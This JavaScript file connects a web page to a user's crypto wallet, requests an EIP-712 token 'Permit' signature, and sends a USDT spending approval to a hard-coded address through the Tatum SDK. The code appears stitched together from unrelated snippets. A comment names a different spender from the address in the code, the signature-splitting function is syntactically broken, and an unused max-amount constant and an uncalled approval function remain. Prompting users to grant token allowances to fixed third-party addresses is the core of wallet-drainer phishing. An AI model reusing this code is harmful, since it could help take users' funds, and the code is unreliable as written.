// Install with: npm install @tatumio/tatum
import { TatumSDK, Network, MetaMask } from "@tatumio/tatum";

const domainName = "MyToken" // put your token name 
const domainVersion = "1" // leave this to "1"
const chainId = 1 // this is for the chain's ID. value is 1 for remix
const contractAddress = "0xd9145CCE52D386f254917e481eB44e9943F39138" // Put the address here from remix
const deadlineDate = 2 ** 53
const maxAmount = 115792089237316195423570985008687907853269984665640564039457584007913129639935
var account = null;

const domain = {
  name: domainName,
  version: domainVersion,
  verifyingContract: contractAddress,
  chainId
}

const domainType = [
  { name: 'name', type: 'string' },
  { name: 'version', type: 'string' },
  { name: 'chainId', type: 'uint256' },
  { name: 'verifyingContract', type: 'address' },
]

const connect = async () => {
  // This helps connect webpage to wallet.
  const providerOptions = {
    walletconnect: {
      package: WalletConnectProvider.default, // required
      options: {
        rpc: {
          1: "https://cloudflare-eth.com",
          137: "https://polygon-rpc.com",
          // ...
        },
      }
    }
  };

  const Web3Modal = window.Web3Modal.default;
  const web3Modal = new Web3Modal({
    network: "mainnet", // optional
    cacheProvider: false, // optional
    providerOptions, // required
    theme: "dark"
  });

  const provider = await web3Modal.connect();

  window.web3 = new Web3(provider);
  var accounts = await web3.eth.getAccounts();
  account = accounts[0];
}

const splitSig = (sig) => {
  // splits the signature to r, s, and v values.
  const pureSig = sig.replace("0x", "")

  const r = new (pureSig.substring(0, 64), 'hex')
  const s = new (pureSig.substring(64, 128), 'hex')
  const v = new ((parseInt(pureSig.substring(128, 130), 16)).toString());


  return {
    r, s, v
  }
}

const signTyped = (dataToSign) => {
  // call this method to sign EIP 712 data
  return new Promise((resolve, reject) => {
    web3.currentProvider.sendAsync({
      method: "eth_signTypedData_v4",
      params: [account, dataToSign],
      from: account
    }, (err, result) => {
      if (err) return reject(err);
      resolve(result.result)
    })
  })
}

async function createPermit(spender, value, nonce, deadline) {
  const permit = { owner: account, spender, value, nonce, deadline }
  const Permit = [
    { name: "owner", type: "address" },
    { name: "spender", type: "address" },
    { name: "value", type: "uint256" },
    { name: "nonce", type: "uint256" },
    { name: "deadline", type: "uint256" },
  ]
  
  const dataToSign = JSON.stringify({
      types: {
          EIP712Domain: domainType,
          Permit: Permit
      },
      domain: domain,
      primaryType: "Permit",
      message: permit
  });

  const signature = await signTyped(dataToSign)
  const split = splitSig(signature)

  return {
    ...split, signature
  }
}

async function approveToken(){
try {
const tatum = await TatumSDK.init({ network: Network.ETHEREUM });
//This is the USDT token address
const USDT = '0xdAC17F958D2ee523a2206206994597C13D831ec7'

const txId = await tatum.walletProvider.use(MetaMask).approveErc20('0xbEbdfa146b1D4AaEAb63C70C392121474d889376', '1.5', USDT);
console.log(txId);
} catch (error) {
console.error("Error signing a transaction using MetaMask:", error);
}
}

// We have prepared an approval operation of 1.5 USDT from your default connected MetaMask account to the spender - 0x4675C7e5BaAFBFFbca748158bEcBA61ef3b0a263

async function main() {
  await connect()

  const permit = await createPermit("0x5B38Da6a701c568545dCfcB03FcB875f56beddC4", 1000, 0, 2661766724)
  console.log(`r: 0x${permit.r.toString('hex')}, s: 0x${permit.s.toString('hex')}, v: ${permit.v}, sig: ${permit.signature}`)
  console.log("Account address: ", account)
console.log("Signed by: ", account)
}





